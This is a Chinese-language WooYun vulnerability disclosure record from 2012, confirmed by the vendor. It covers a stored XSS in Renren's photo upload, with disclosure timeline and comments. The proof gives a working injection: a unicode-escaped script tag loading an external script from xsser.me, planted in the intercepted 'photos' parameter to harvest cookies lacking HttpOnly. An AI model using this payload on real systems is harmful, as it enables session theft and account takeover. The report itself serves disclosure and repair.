{"id": 17430, "wybug_id": "wooyun-2012-010713", "wybug_title": "人人网某处存储型XSS，居然跨不了客服妹子。。。", "wybug_corp": "人人网", "wybug_author": "imlonghao", "wybug_date": "2012-08-08 23:04", "wybug_open_date": "2012-09-22 23:05", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-08-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-08-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-08-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-09-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-09-22：\t细节向公众公开  简要描述： 欢迎人人网回来，特发此洞！某处一个存储型的XSS，看了就中，还会同步到新鲜事~~客服妹子太聪明，居然跨不了她。。。目测木有设置HTTPONLY，获取COOKIES后轻松入侵~~目测还有红包？嘿嘿。。 详细说明：  相册中，上传一张相片，目测对photos过滤不严格，再次目测貌似什么都没过滤，所以就产生了XSS。再加上没有设置HTTPONLY，所以拿到了cookies后就可以随意进入你的人人网了哦~~另外，客服很聪明，居然跨不了他，呜呜。。。\n\n   漏洞证明：  测试地址：\nhttp://photo.renren.com/photo/sp/foA-BJTryEQ\n过程如下：在相册中随意上传一张相片，到发布的时候截包。放过前面几个包，到http://upload.renren.com/upload/[YOUR ID]/finish_upload/v1.0的时候停下。\n\n关键就是其中的photos参数~信息如下，\n%5B%7B%22code%22%3A0%2C%22msg%22%3A%22%22%2C%22filename%22%3A%22nofilename.jpg%22%2C%22filesize%22%3A814%2C%22width%22%3A292%2C%22height%22%3A250%2C%22images%22%3A%5B%7B%22url%22%3A%22fmn061%2F20120808%2F1520%2Foriginal_rEuR_1b880000eece118d.jpg%22%2C%22type%22%3A%22large%22%2C%22width%22%3A292%2C%22height%22%3A250%7D%2C%7B%22url%22%3A%22fmn061%2F20120808%2F1520%2Fmain_rEuR_1b880000eece118d.jpg%22%2C%22type%22%3A%22main%22%2C%22width%22%3A200%2C%22height%22%3A171%7D%2C%7B%22url%22%3A%22fmn061%2F20120808%2F1520%2Ftiny_rEuR_1b880000eece118d.jpg%22%2C%22type%22%3A%22tiny%22%2C%22width%22%3A50%2C%22height%22%3A50%7D%2C%7B%22url%22%3A%22fmn061%2F20120808%2F1520%2Fhead_rEuR_1b880000eece118d.jpg%22%2C%22type%22%3A%22head%22%2C%22width%22%3A100%2C%22height%22%3A85%7D%2C%7B%22url%22%3A%22fmn061%2F20120808%2F1520%2Foriginal_rEuR_1b880000eece118d.jpg%22%2C%22type%22%3A%22xlarge%22%2C%22width%22%3A292%2C%22height%22%3A250%7D%5D%2C%22tempID%22%3A%22fileItem335152128_0%22%2C%22title%22%3A%22%22%7D%5D\nURIComp解码，得到\n[{\"code\":0,\"msg\":\"\",\"filename\":\"nofilename.jpg\",\"filesize\":814,\"width\":292,\"height\":250,\"images\":[{\"url\":\"fmn061/20120808/1520/original_rEuR_1b880000eece118d.jpg\",\"type\":\"large\",\"width\":292,\"height\":250},{\"url\":\"fmn061/20120808/1520/main_rEuR_1b880000eece118d.jpg\",\"type\":\"main\",\"width\":200,\"height\":171},{\"url\":\"fmn061/20120808/1520/tiny_rEuR_1b880000eece118d.jpg\",\"type\":\"tiny\",\"width\":50,\"height\":50},{\"url\":\"fmn061/20120808/1520/head_rEuR_1b880000eece118d.jpg\",\"type\":\"head\",\"width\":100,\"height\":85},{\"url\":\"fmn061/20120808/1520/original_rEuR_1b880000eece118d.jpg\",\"type\":\"xlarge\",\"width\":292,\"height\":250}],\"tempID\":\"fileItem335152128_0\",\"title\":\"\"}]\n目测，通常这种都没有过滤js unicode后的代码。所以我们将JS代码unicode一下。\n\"><script src=http://xsser.me/pIQKKz></script>\n\n\\u0022\\u003e\\u003c\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0020\\u0073\\u0072\\u0063\\u003d\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0078\\u0073\\u0073\\u0065\\u0072\\u002e\\u006d\\u0065\\u002f\\u0070\\u0049\\u0051\\u004b\\u004b\\u007a\\u003e\\u003c\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e\n将UNICODE后的插在图片地址的后面。\n[{\"code\":0,\"msg\":\"\",\"filename\":\"nofilename.jpg\",\"filesize\":814,\"width\":292,\"height\":250,\"images\":[{\"url\":\"fmn061/20120808/1520/original_rEuR_1b880000eece118d.jpg\\u0022\\u003e\\u003c\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0020\\u0073\\u0072\\u0063\\u003d\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0078\\u0073\\u0073\\u0065\\u0072\\u002e\\u006d\\u0065\\u002f\\u0070\\u0049\\u0051\\u004b\\u004b\\u007a\\u003e\\u003c\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e\",\"type\":\"large\",\"width\":292,\"height\":250},{\"url\":\"fmn061/20120808/1520/main_rEuR_1b880000eece118d.jpg\",\"type\":\"main\",\"width\":200,\"height\":171},{\"url\":\"fmn061/20120808/1520/tiny_rEuR_1b880000eece118d.jpg\",\"type\":\"tiny\",\"width\":50,\"height\":50},{\"url\":\"fmn061/20120808/1520/head_rEuR_1b880000eece118d.jpg\",\"type\":\"head\",\"width\":100,\"height\":85},{\"url\":\"fmn061/20120808/1520/original_rEuR_1b880000eece118d.jpg\",\"type\":\"xlarge\",\"width\":292,\"height\":250}],\"tempID\":\"fileItem335152128_0\",\"title\":\"\"}]\n然后给他进行URIComp编码。将这个替换fiddler中的photo中的参数。\n%5B%7B%22code%22%3A0%2C%22msg%22%3A%22%22%2C%22filename%22%3A%22nofilename.jpg%22%2C%22filesize%22%3A814%2C%22width%22%3A292%2C%22height%22%3A250%2C%22images%22%3A%5B%7B%22url%22%3A%22fmn061%2F20120808%2F1520%2Foriginal_rEuR_1b880000eece118d.jpg%5Cu0022%5Cu003e%5Cu003c%5Cu0073%5Cu0063%5Cu0072%5Cu0069%5Cu0070%5Cu0074%5Cu0020%5Cu0073%5Cu0072%5Cu0063%5Cu003d%5Cu0068%5Cu0074%5Cu0074%5Cu0070%5Cu003a%5Cu002f%5Cu002f%5Cu0078%5Cu0073%5Cu0073%5Cu0065%5Cu0072%5Cu002e%5Cu006d%5Cu0065%5Cu002f%5Cu0070%5Cu0049%5Cu0051%5Cu004b%5Cu004b%5Cu007a%5Cu003e%5Cu003c%5Cu002f%5Cu0073%5Cu0063%5Cu0072%5Cu0069%5Cu0070%5Cu0074%5Cu003e%22%2C%22type%22%3A%22large%22%2C%22width%22%3A292%2C%22height%22%3A250%7D%2C%7B%22url%22%3A%22fmn061%2F20120808%2F1520%2Fmain_rEuR_1b880000eece118d.jpg%22%2C%22type%22%3A%22main%22%2C%22width%22%3A200%2C%22height%22%3A171%7D%2C%7B%22url%22%3A%22fmn061%2F20120808%2F1520%2Ftiny_rEuR_1b880000eece118d.jpg%22%2C%22type%22%3A%22tiny%22%2C%22width%22%3A50%2C%22height%22%3A50%7D%2C%7B%22url%22%3A%22fmn061%2F20120808%2F1520%2Fhead_rEuR_1b880000eece118d.jpg%22%2C%22type%22%3A%22head%22%2C%22width%22%3A100%2C%22height%22%3A85%7D%2C%7B%22url%22%3A%22fmn061%2F20120808%2F1520%2Foriginal_rEuR_1b880000eece118d.jpg%22%2C%22type%22%3A%22xlarge%22%2C%22width%22%3A292%2C%22height%22%3A250%7D%5D%2C%22tempID%22%3A%22fileItem335152128_0%22%2C%22title%22%3A%22%22%7D%5D\n图在上面~~~然后我们打开图片开源码，果断的X了。\n\n同时，目测在新鲜事中也会有同步。\n\n看了看新鲜事中的源码，也有JS链接，不过貌似不运行。。。-_-||限制了新鲜事中的JS运行？不过也无伤大雅，其他用户看到那么奇葩的代码应该都会去点一点的。。。点就跨~~   修复方案：  过滤photo中的输入~只允许图片URL中出现英文和.不如加上HTTPONLY？   版权声明：转载请注明来源 imlonghao@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2012-08-09 19:00 厂商回复： 十分感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-08-09 06:43 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  萌妹子。    \n     2012-08-09 09:32 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  。    \n     2012-08-09 13:52 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  妹纸亮了~~    \n     2012-08-09 14:05 |    \t\tc4bbage \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:7        | var_dump($me);)\t\t \n  寻妹 寻洞。    \n     2012-08-09 18:26 |    \t\txixi \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:8        | 别瞎BB。。。。。。。。。。)\t\t \n  关注    \n     2013-03-23 22:47 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  估计没回复，是系统自己回复的。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}